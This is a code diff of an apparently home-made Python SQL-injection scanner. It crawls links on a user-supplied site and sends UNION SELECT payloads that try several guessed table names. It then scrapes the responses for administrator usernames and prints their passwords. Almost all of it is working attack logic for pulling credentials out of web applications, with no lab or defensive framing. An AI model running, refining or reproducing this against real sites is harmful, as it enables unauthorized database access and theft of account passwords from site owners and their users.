@@ -76,14 +76,22 @@ def find_urls_to_test(url, base_url):
         if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
             continue
         
-        full_url = href if href.startswith('http') else base_url + href
+        if href.startswith('/'):
+            full_url = base_url + href
+        elif href.startswith('http'):
+            full_url = href
+        else:
+            full_url = f"{base_url}/{href}"  # Ensure a slash is added between base and path
         
-        if "Id" not in href:
-            links.add(full_url)
-            if "?" in href:
-               links.add(full_url)
-            elif href.startswith('/'):
-               links.add(full_url)
+        links.add(full_url)
+        #full_url = href if href.startswith('http') else base_url + href
+        
+        #if "Id" not in href:
+        #    links.add(full_url)
+        #    if "?" in href:
+        #       links.add(full_url)
+        #    elif href.startswith('/'):
+        #       links.add(full_url)
 
     if not links:
         print("[!] No parameterized URLs found, searching deeper in the page source...")
@@ -120,35 +128,42 @@ def exploit_sqli_users_table(url):
     """
     
     common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
-    sql_payload = "' UNION select username, password from users--"
-    #r = requests.get(url + sql_payload, verify=False, proxies=proxies)
-    try:
-        r = requests.get(url + sql_payload, verify=False, proxies=proxies, timeout=10)
-    except SSLError as e:
-        print(f"[-] SSL Error en {url}: {e}")
-        return False
+    #sql_payload = "' UNION select username, password from users--"
+    possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']
     
-    if "text/html" in r.headers.get("Content-Type", ""):
-        soup = BeautifulSoup(r.text, 'html.parser')
-    else:
-        #print("[-] The response is not HTML type.")
-        return False
+    for table in possible_tables:
+        sql_payload = f"' UNION select username, password from {table}--"
+        
+        try:
+            r = requests.get(url + sql_payload, verify=False, proxies=proxies, timeout=10)
+        except SSLError as e:
+            print(f"[-] SSL Error en {url}: {e}")
+            continue
     
-    if not soup.body:
-        print("[-] The body is not in the HTML response.")
-        return False
+        if "text/html" in r.headers.get("Content-Type", ""):
+            soup = BeautifulSoup(r.text, 'html.parser')
+        else:
+            #print("[-] The response is not HTML type.")
+            continue
     
-    for username in common_usernames:
-        user_element = soup.body.find(string=username)
-        if user_element:
-            parent = user_element.parent
-            password_element = parent.findNext('td') if parent else None
-            if password_element and password_element.contents:
-                admin_password = password_element.contents[0]
-                print(f"[+] User password found for '{username}': '{admin_password}")
-                return True
+        if not soup.body:
+            print("[-] The body is not in the HTML response.")
+            continue
+    
+        for username in common_usernames:
+            user_element = soup.body.find(string=username)
+            if user_element:
+                parent = user_element.parent
+                password_element = parent.findNext('td') if parent else None
+                
+                if password_element and password_element.contents:
+                    admin_password = password_element.contents[0]
+                    print(f"[+] User password found for '{username}': '{admin_password}' in table '{table}'")
+                    return True
+        print(f"[-] No se encontraron usuarios comunes en la tabla '{table}'. Probando con otra tabla...")
         #else:
             #print(f"[-] User '{username}' not found in the response.")
+       
     
     return False
 
@@ -231,7 +246,7 @@ def exploit_sqli_column_number(url):
 
 if __name__ == "__main__":
     
-    base_url = input("Enter the URL you want to scan:  ").strip()
+    base_url = input("Enter the URL you want to scan: ").strip()
     base_url = base_url.rstrip('/')
 
     print("[+] Inspecting the different paths for the entered page...")
